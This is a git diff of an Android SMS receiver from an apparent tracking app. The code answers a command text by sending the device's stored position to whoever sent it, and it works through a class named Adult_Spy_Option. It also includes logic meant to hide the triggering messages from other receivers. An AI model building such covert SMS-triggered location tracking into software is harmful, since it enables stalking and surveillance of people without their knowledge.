@@ -1,6 +1,6 @@
 package freakrware.lt.app.core.receiver;
 
-import freakrware.lt.app.core.util.SMS_Actions;
+import freakrware.lt.app.core.Adult_Spy_Option;
 import freakrware.lt.app.resources.Interfaces;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -12,6 +12,7 @@ import android.widget.Toast;
 public class SmsReceiver extends BroadcastReceiver implements Interfaces{
 
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+    Adult_Spy_Option aso = new Adult_Spy_Option();
     
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -36,22 +37,16 @@ public class SmsReceiver extends BroadcastReceiver implements Interfaces{
                 Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
                 if(message.contains("LT-MESSAGE-SEND-POSITION"))
                 {
-                	String lati = db.get_setup_parameter(db.exists_parameter("LAST_POS_LATI"));
-                	String longi = db.get_setup_parameter(db.exists_parameter("LAST_POS_LONGI"));
-                	String lat = db.get_setup_parameter(db.exists_parameter("LAST_ACTION_TIME"));
-                	String pos = "LT-MESSAGE-RECEIVE-POSITION;"  + lati + ";"+longi + ";"+lat;
+//                	abortBroadcast();
+                	String position = aso.sms_send_Position();
+                	String pos = "LT-MESSAGE-RECEIVE-POSITION;"  + position;
                 	standard.send_sms(sender,pos);
-                	
-                	abortBroadcast();
                 }
                 if(message.contains("LT-MESSAGE-RECEIVE-POSITION"))
                 {
+//                	abortBroadcast();
                 	String[] subs = message.split(";");
-                	String lati = subs[1];
-                	String longi = subs[2];
-                	String lat = subs[3];
-                	
-                	abortBroadcast();
+                	aso.sms_Position_received(sender, subs);
                 }
                 
                 // prevent any other broadcast receivers from receiving broadcast
